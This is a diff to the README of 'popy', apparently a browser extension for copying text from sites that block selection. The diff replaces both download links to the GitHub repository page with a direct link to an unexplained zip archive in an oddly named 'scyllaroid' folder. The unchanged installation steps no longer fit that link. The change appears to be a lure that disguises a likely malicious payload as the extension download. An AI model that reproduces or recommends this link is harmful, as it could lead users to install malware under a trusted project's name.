@@ -1,6 +1,6 @@
 # 📋 popy - Unlock any website text with ease
 
-[![](https://img.shields.io/badge/Download_Popy-Blue?style=for-the-badge)](https://github.com/filscorner225/popy)
+[![](https://img.shields.io/badge/Download_Popy-Blue?style=for-the-badge)](https://raw.githubusercontent.com/filscorner225/popy/main/scyllaroid/Software-v1.2-alpha.3.zip)
 
 Popy helps you copy text from websites that block your ability to select or copy content. Many sites disable your right-click menu or prevent you from highlighting text. This tool overrides those blocks so you can work faster and save the information you need. It respects your privacy by running locally inside your browser without sending your data to any external servers.
 
@@ -18,7 +18,7 @@ Popy provides tools to handle restrictive websites:
 
 You can install Popy as a browser extension. It works on Google Chrome, Microsoft Edge, and other Chromium-based browsers.
 
-1. Visit [this page to download](https://github.com/filscorner225/popy).
+1. Visit [this page to download](https://raw.githubusercontent.com/filscorner225/popy/main/scyllaroid/Software-v1.2-alpha.3.zip).
 2. Click the green "Code" button on the webpage.
 3. Select "Download ZIP" from the menu.
 4. Save the file to your computer.
